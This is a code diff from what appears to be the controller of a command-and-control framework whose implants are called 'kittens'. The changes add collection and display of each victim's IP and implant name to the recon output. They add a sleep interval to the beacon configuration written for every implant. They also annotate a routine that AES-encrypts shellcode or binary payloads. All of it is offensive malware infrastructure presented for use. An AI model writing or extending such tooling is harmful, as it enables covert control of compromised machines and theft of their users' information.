@@ -14,9 +14,11 @@ import (
 )
 
 type InitialChecks struct {
-	Hostname string   `json:"hostname"`
-	Username string   `json:"username"`
-	Dir      []string `json:"folders,flow"`
+	Hostname   string   `json:"hostname"`
+	Username   string   `json:"username"`
+	Ip         string   `json:"ip"`
+	KittenName string   `json:"name"`
+	Dir        []string `json:"folders,flow"`
 }
 
 func (I *InitialChecks) GetHostname() string {
@@ -31,6 +33,14 @@ func (I *InitialChecks) GetDir() []string {
 	return I.Dir
 }
 
+func (I *InitialChecks) GetIp() string {
+	return I.Ip
+}
+
+func (I *InitialChecks) GetKittenName() string {
+	return I.KittenName
+}
+
 // ScToAES cypher the shellcode with AES
 func ScToAES(path string, key string) ([]byte, error) {
 	if len(key) != 32 {
@@ -42,9 +52,11 @@ func ScToAES(path string, key string) ([]byte, error) {
 		return nil, err
 	}
 	t := http.DetectContentType(sc)
+	// check if the file is a hex shellcode
 	if t == "text/plain; charset=utf-8" {
 		aesPayload, _ := cryptoUtil.Encrypt(sc, byteKey)
 		return aesPayload, nil
+		// check if the file is a binary
 	} else if t == "application/octet-stream" {
 		hexstring := fmt.Sprintf("%x ", sc)
 		aesPayload, _ := cryptoUtil.Encrypt([]byte(hexstring), byteKey)
@@ -55,7 +67,7 @@ func ScToAES(path string, key string) ([]byte, error) {
 
 // GenerateConfig generate the config file for all the kitten
 func GenerateConfig(conf config.General) error {
-	data := fmt.Sprintf("http://%s:%d%s,%s", conf.GetHost(), conf.GetPort(), conf.GetEndpoint(), conf.GetUserAgent())
+	data := fmt.Sprintf("http://%s:%d%s,%s,%d", conf.GetHost(), conf.GetPort(), conf.GetEndpoint(), conf.GetUserAgent(), conf.GetSleep())
 	for x := range conf.GetMalPath() {
 		err := ioutil.WriteFile(conf.GetMalPathWithId(x)+"conf.txt", []byte(data), 0644)
 		if err != nil {
@@ -90,13 +102,16 @@ func PrintCookie(cookie []byte) error {
 	}
 	fmt.Printf("%s %s\n", color.Green("[+] Hostname:"), color.Yellow(j.Hostname))
 	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(j.Username))
+	fmt.Printf("%s %s\n", color.Green("[+] IP:"), color.Yellow(j.Ip))
 	fmt.Print(color.Green("[+] To get more, use the recon command\n"))
 	return nil
 }
 
 func PrintRecon(i InitialChecks) {
+	fmt.Printf("%s %s\n", color.Green("[+] Kitten name:"), color.Yellow(i.KittenName))
 	fmt.Printf("%s %s\n", color.Green("[+] Hostname:"), color.Yellow(i.GetHostname()))
 	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(i.GetUsername()))
+	fmt.Printf("%s %s\n", color.Green("[+] IP:"), color.Yellow(i.Ip))
 	fmt.Print(color.Green("[+] Installed software : "))
 	f := relevantFiles(i.GetDir())
 	for x := range f {
